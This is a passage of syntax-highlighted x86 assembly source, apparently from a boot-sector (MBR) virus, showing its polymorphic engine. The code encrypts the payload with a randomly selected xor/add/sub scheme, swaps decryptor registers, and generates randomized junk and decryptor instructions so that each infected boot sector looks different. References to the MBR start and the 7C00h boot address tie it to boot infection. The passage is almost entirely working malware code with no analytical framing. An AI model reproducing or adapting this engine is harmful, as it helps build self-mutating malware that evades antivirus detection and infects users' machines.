        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">real_poly</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">MBR_real_start</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">512d</span><span class="sc4">-</span><span class="sc2">153d</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">boot_decr_offset</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">boot_decr_inst</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">do_crypt_inst</span><span class="sc4">],</span><span class="sc2">05h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">remaining</span><span class="sc4">],</span><span class="sc2">150d</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">@place_to</span><span class="sc4">],</span><span class="sc2">7c00h</span><span class="sc4">+</span><span class="sc2">151d</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">real_poly</span><span class="sc0">

        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;*-*-*-*-*-*-*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*-*-*-*-*-*-*-</span><span class="sc0">
</span><span class="sc1">;*-*-*-*-*-*-*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*-*-*-*-*-*-*-</span><span class="sc0">


</span><span class="sc5">real_poly</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc1">; First of all, encrypt.</span><span class="sc0">

</span><span class="sc5">encrypt</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">crypts</span><span class="sc0">
        </span><span class="sc6">xlat</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Encrypt_kind</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">  </span><span class="sc1">; Al has the byte which</span><span class="sc0">
                                        </span><span class="sc1">;determines kind of encryption</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">30h</span><span class="sc0">              </span><span class="sc1">; Select which decryption to use</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">do_cryptor_b</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">              </span><span class="sc1">; Swap add/sub</span><span class="sc0">
</span><span class="sc5">do_cryptor_b</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">mode</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Crypt_value</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
</span><span class="sc5">do_cryptor</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">02eh</span><span class="sc0">                </span><span class="sc1">; cs:</span><span class="sc0">
</span><span class="sc5">mode</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">30h</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">             </span><span class="sc1">; xor [si],al</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">do_cryptor</span><span class="sc0">

</span><span class="sc1">;***************************************************************************</span><span class="sc0">
</span><span class="sc1">;                      Finished crypting. Fun starts :)</span><span class="sc0">
</span><span class="sc1">;***************************************************************************</span><span class="sc0">

</span><span class="sc5">@switchSiDi</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc1">; Switches SI and DI in decryptor</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">0beh</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@switch</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">encrypt_kind</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc0">

</span><span class="sc5">@switch</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">boot_decr_inst</span><span class="sc4">],</span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">78h</span><span class="sc0">      </span><span class="sc1">; inc si=46h, di=47h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Incer</span><span class="sc4">],</span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">      </span><span class="sc1">; si=3ch, di=3dh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">SiInCmp</span><span class="sc4">],</span><span class="sc8">bl</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">              </span><span class="sc1">; Random</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                  </span><span class="sc1">; fix</span><span class="sc0">


</span><span class="sc1">;(*ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ*)</span><span class="sc0">
</span><span class="sc1">;(*                       Main Polymorphic engine                          *)</span><span class="sc0">
</span><span class="sc1">;(*ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ*)</span><span class="sc0">

</span><span class="sc5">Main_poly</span><span class="sc4">:</span><span class="sc0">                      </span><span class="sc1">; ES:DI where to put it</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                  </span><span class="sc1">; Fix the push before</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">6d</span><span class="sc0">               </span><span class="sc1">; kinda instructions</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random</span><span class="sc0">          </span><span class="sc1">; =&gt; bl limit, number before</span><span class="sc0">
                                </span><span class="sc1">; =&gt; bx random number</span><span class="sc0">

    </span><span class="sc1">; Go to instruction kind depending on table</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">remaining</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">do_crypt_inst</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cbw</span><span class="sc0">                                 </span><span class="sc1">; force decryptor if necessary</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">22d</span><span class="sc0">              </span><span class="sc1">; for 150d</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">@Non_need_to_force</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">do_crypt_inst</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@Non_need_to_force</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc5">@Non_need_to_force</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">@Non_ending</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@Make_us_one</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@Make_us_two</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@Make_us_three</span><span class="sc0">
</span><span class="sc5">@Make_us_four</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc0">
</span><span class="sc5">@Make_us_two</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc0">
</span><span class="sc5">@Make_us_three</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc0">
</span><span class="sc5">@Make_us_one</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc0">
</span><span class="sc5">@Non_ending</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">generator_table1</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">               </span><span class="sc1">; Points to an instruction kind</span><span class="sc0">
        </span><span class="sc6">lodsw</span><span class="sc0">                       </span><span class="sc1">; Al, number of table entries</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

    </span><span class="sc1">; We've got in SI the InstructionKind table beggining offset</span><span class="sc0">

        </span><span class="sc6">lodsb</span><span class="sc0">                       </span><span class="sc1">; Number of bytes</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">               </span><span class="sc1">; Now in bl ( limit )</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random</span><span class="sc0">          </span><span class="sc1">; Gets another random number</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">               </span><span class="sc1">;for non-losing the number in the table</span><span class="sc0">
                                    </span><span class="sc1">;and have last random in the beggining</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">                       </span><span class="sc1">; fixed block instructions length</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">               </span><span class="sc1">; 0h tells decryptor instructions</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">Make_decryptor_inst</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">random_make</span><span class="sc4">],</span><span class="sc2">0h</span><span class="sc0">    </span><span class="sc1">; Initialize random_make</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">@No_parameters</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">                       </span><span class="sc1">; random number length</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">random_make</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">    </span><span class="sc1">; In random_make</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">                  </span><span class="sc1">; Fix</span><span class="sc0">

</span><span class="sc5">@No_parameters</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">               </span><span class="sc1">; To see how many bytes will copy</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">                  </span><span class="sc1">; BX = instr number, CX = number of bytes</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">

</span><span class="sc5">@add_cx</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">               </span><span class="sc1">; Now it has an instruction kind caught</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">@add_cx</span><span class="sc0">             </span><span class="sc1">;in DS:SI</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                  </span><span class="sc1">; And CX is it's bytes number</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">remaining</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0">  </span><span class="sc1">; Subs the number of copied bytes</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">random_make</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@non_random_use</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0abcdh</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random</span><span class="sc0">          </span><span class="sc1">; Random number in AX for instruction</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc5">@Store_random</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">remaining</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">@Store_random</span><span class="sc0">

</span><span class="sc5">@non_random_use</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">remaining</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@finished</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Main_poly</span><span class="sc0">

</span><span class="sc1">;(*ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ*)</span><span class="sc0">
</span><span class="sc1">;                     Makes a decryptor instruction on it</span><span class="sc0">
</span><span class="sc1">;(*ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ*)</span><span class="sc0">

</span><span class="sc5">Make_decryptor_inst</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@no_more_dec</span><span class="sc0">          </span><span class="sc1">; 5:4:3:2:1 -&gt; 6§ change ( =1 ), bye</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">              </span><span class="sc1">; Check to make correct jnz</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">@non_op_dec</span><span class="sc0">         </span><span class="sc1">;storing the relative offset</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">remaining</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">7d</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">offset_codify</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">

</span><span class="sc5">@non_op_dec</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">@non_jnz</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">offset_codify</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">remaining</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Where_junz</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">


</span><span class="sc5">@non_jnz</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">          </span><span class="sc1">; Fix</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">          </span><span class="sc1">; We make it point where we need, beginning bytes</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">4d</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">               </span><span class="sc1">; Position in bytes number</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">                       </span><span class="sc1">;AL number of bytes</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">boot_decr_offset</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; instruction to send</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">               </span><span class="sc1">; times to write</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">boot_decr_offset</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">remaining</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">               </span><span class="sc1">; copy the instruction</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">remaining</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">@dece</span><span class="sc0">

</span><span class="sc5">@@finished</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

